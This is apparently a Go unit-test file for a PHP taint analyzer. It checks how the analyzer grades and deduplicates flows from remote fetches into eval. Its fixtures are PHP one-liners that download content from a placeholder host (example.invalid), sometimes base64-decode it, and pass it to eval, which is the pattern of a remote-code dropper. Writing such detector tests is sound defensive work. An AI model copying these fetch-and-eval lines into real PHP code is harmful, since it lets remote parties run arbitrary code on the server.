package phptaint

import (
	"context"
	"testing"
)

func TestBasisValid(t *testing.T) {
	for _, b := range []Basis{BasisAlwaysRemote, BasisLiteral, BasisDecoded, BasisRequest, BasisCallArgument, BasisUnresolved} {
		if !b.Valid() {
			t.Errorf("%q: want valid", b)
		}
	}
	for _, b := range []Basis{"", "Literal", "remote", "unresolved "} {
		if b.Valid() {
			t.Errorf("%q: want invalid", b)
		}
	}
}

// The order is the spec's: confidence first, then basis priority, then the
// lowest resolution offset. Each row pins one rule so ablating any one of
// them fails a named case.
func TestGradeStronger(t *testing.T) {
	for _, tc := range []struct {
		name string
		a, b grade
		want bool
	}{
		{"confidence wins over basis", grade{ConfidenceHigh, BasisUnresolved, -1}, grade{ConfidenceLow, BasisAlwaysRemote, -1}, true},
		{"lower confidence loses", grade{ConfidenceLow, BasisAlwaysRemote, -1}, grade{ConfidenceHigh, BasisUnresolved, -1}, false},
		{"basis priority on tie", grade{ConfidenceHigh, BasisLiteral, -1}, grade{ConfidenceHigh, BasisDecoded, -1}, true},
		{"always-remote beats literal", grade{ConfidenceHigh, BasisAlwaysRemote, -1}, grade{ConfidenceHigh, BasisLiteral, -1}, true},
		{"request beats call-argument", grade{ConfidenceHigh, BasisRequest, -1}, grade{ConfidenceHigh, BasisCallArgument, -1}, true},
		{"call-argument beats unresolved", grade{ConfidenceHigh, BasisCallArgument, 5}, grade{ConfidenceHigh, BasisUnresolved, -1}, true},
		{"lower offset on full tie", grade{ConfidenceHigh, BasisCallArgument, 3}, grade{ConfidenceHigh, BasisCallArgument, 9}, true},
		{"direct offset -1 is lowest", grade{ConfidenceHigh, BasisCallArgument, -1}, grade{ConfidenceHigh, BasisCallArgument, 0}, true},
		{"equal is not stronger", grade{ConfidenceHigh, BasisLiteral, -1}, grade{ConfidenceHigh, BasisLiteral, -1}, false},
	} {
		if got := tc.a.stronger(tc.b); got != tc.want {
			t.Errorf("%s: stronger = %v, want %v", tc.name, got, tc.want)
		}
	}
}

func onlyResult(t *testing.T, src []byte) Result {
	t.Helper()
	r := Analyze(context.Background(), src)
	if r.Status != StatusAnalyzed || len(r.Results) != 1 || r.TotalResults != 1 {
		t.Fatalf("report = %+v, want exactly one analyzed result", r)
	}
	return r.Results[0]
}

func TestResultBasisForExistingGrades(t *testing.T) {
	for _, tc := range []struct {
		name  string
		src   string // PHP, stored here as plain text: none of these is a working dropper URL (example.invalid)
		conf  Confidence
		basis Basis
	}{
		{"always-remote", `<?php $c = curl_init('x'); eval(curl_exec($c));`, ConfidenceHigh, BasisAlwaysRemote},
		{"literal", `<?php eval(file_get_contents('https://example.invalid/p'));`, ConfidenceHigh, BasisLiteral},
		{"unresolved", `<?php eval(file_get_contents($u));`, ConfidenceLow, BasisUnresolved},
		{"certain keeps source basis", `<?php eval(base64_decode(file_get_contents('https://example.invalid/p')));`, ConfidenceCertain, BasisLiteral},
		{"certain unresolved keeps unresolved", `<?php eval(base64_decode(file_get_contents($u)));`, ConfidenceCertain, BasisUnresolved},
		{"through variable", `<?php $d = file_get_contents('https://example.invalid/p'); eval($d);`, ConfidenceHigh, BasisLiteral},
		{"through summary", `<?php function f() { return file_get_contents('https://example.invalid/p'); } eval(f());`, ConfidenceHigh, BasisLiteral},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := onlyResult(t, []byte(tc.src))
			if got.Confidence != tc.conf || got.Basis != tc.basis || got.ResolutionOffset != -1 {
				t.Fatalf("result = %+v, want confidence %v basis %q offset -1", got, tc.conf, tc.basis)
			}
		})
	}
}

// Deduplication keeps the stronger flow's own explanation: a Low unresolved
// flow and a High literal flow that render the same endpoint pair must
// report High with the literal basis, never High with "unresolved".
func TestDedupeKeepsStrongerBasis(t *testing.T) {
	src := `<?php
eval(file_get_contents($u));
eval(file_get_contents('https://example.invalid/p'));`
	got := onlyResult(t, []byte(src))
	if got.Confidence != ConfidenceHigh || got.Basis != BasisLiteral {
		t.Fatalf("result = %+v, want High literal", got)
	}
}

func TestFinalizeKeepsBasis(t *testing.T) {
	r := finalizeReport(Report{Status: StatusAnalyzed, TotalResults: 1,
		Results: []Result{{Source: "s", Sink: "eval", Confidence: ConfidenceLow, Basis: BasisUnresolved, ResolutionOffset: -1}}})
	if r.Results[0].Basis != BasisUnresolved || r.Results[0].ResolutionOffset != -1 {
		t.Fatalf("finalize altered evidence: %+v", r.Results[0])
	}
}

// The solver joins every active origin of a variable by grade, so the
// weaker proof seen first never hides a stronger one seen later.
func TestSolverJoinKeepsStrongerGrade(t *testing.T) {
	for _, tc := range []struct {
		name string
		src  string
	}{
		{"two assignments", `<?php
$d = file_get_contents($u);
$d = file_get_contents('https://example.invalid/p');
eval($d);`},
		// Both origins feed one assignment; the weaker one comes first in
		// source order, which is the order the solver visits them.
		{"one assignment two origins", `<?php
$d = file_get_contents($u) . file_get_contents('https://example.invalid/p');
eval($d);`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := onlyResult(t, []byte(tc.src))
			if got.Confidence != ConfidenceHigh || got.Basis != BasisLiteral || got.ResolutionOffset != -1 {
				t.Fatalf("result = %+v, want High literal offset -1", got)
			}
		})
	}
}
